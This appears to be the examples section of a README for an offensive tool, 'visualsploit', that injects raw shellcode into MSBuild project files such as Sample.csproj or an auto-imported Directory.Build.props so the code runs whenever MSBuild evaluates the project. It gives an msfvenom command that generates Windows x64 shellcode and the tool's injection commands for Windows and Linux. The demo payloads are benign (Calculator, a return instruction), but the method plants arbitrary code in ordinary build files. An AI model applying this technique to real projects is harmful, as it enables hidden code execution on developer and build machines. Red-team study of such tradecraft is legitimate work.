# Examples

The examples below use `Sample.csproj` as the simplest single project target. `Directory.Build.props` is imported automatically by projects below its directory, so the generated target runs when MSBuild evaluates those projects. Existing `.proj`, `.props`, and `.targets` files are valid targets too, but they only run when MSBuild evaluates the `.proj` file or when a project imports the `.props`/`.targets` file.

Generate a Windows x64 sample that launches Calculator:

```bash
msfvenom -p windows/x64/exec CMD=calc.exe EXITFUNC=thread -f raw -o calc.bin
visualsploit Sample.csproj calc.bin -s 42 --platform windows
```

Generate a Linux smoke test payload that returns immediately:

```bash
printf '\303' > ret.bin
visualsploit Sample.csproj ret.bin -s 42 --platform linux
```
